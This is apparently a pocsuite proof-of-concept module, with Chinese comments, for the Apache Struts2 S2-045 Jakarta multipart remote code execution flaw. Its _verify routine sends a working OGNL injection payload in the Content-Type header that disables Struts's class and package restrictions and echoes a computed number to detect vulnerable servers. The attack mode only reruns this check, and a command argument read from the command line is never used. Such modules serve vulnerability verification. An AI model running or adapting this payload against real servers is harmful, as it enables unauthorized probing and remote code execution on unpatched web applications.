#!/usr/bin/env python
# coding: utf-8

import urllib
import random
import string
from collections import OrderedDict

from pocsuite.api.request import req  #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import sys
# import requests
# from poster.encode import multipart_encode
# from poster.streaminghttp import register_openers
cmd= sys.argv[2]

class TestPOC(POCBase):
    vulID = '1571'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = 'lyb'  #  PoC作者的大名
    vulDate = '2018/4/7'  #漏洞公开的时间,不知道就写今天
    createDate = '2018/3/7'  # 编写 PoC 的日期
    updateDate = '2018/3/7'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://www.seebug.org/vuldb/ssvid-92746']  # 漏洞地址来源,0day不用写
    name = 'struts2-045 命令执行 PoC'  # PoC 名称
    appPowerLink = 'https://www.seebug.org/'  # 漏洞厂商主页地址
    appName = 'struts2'  # 漏洞应用名称
    appVersion = '<2.3.32'  # 漏洞影响版本
    vulType = 'Command Execution'  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        基于 Jakarta plugin插件的Struts远程代码执行漏洞，恶意用户可在上传文件时通过修改 HTTP请求头中的 Content-Type 值来触发该 漏洞，进而执行系统命令。
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['poster']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _attack(self):
        '''attack mode'''
        return self._verify()
    def _verify(self,verify=True):
        result={}
        vul_url=self.url
        payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}"
        headers = {}
        headers["Content-Type"] = payload
        r = req.get(vul_url, headers=headers)
        if "105059592" in r.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)
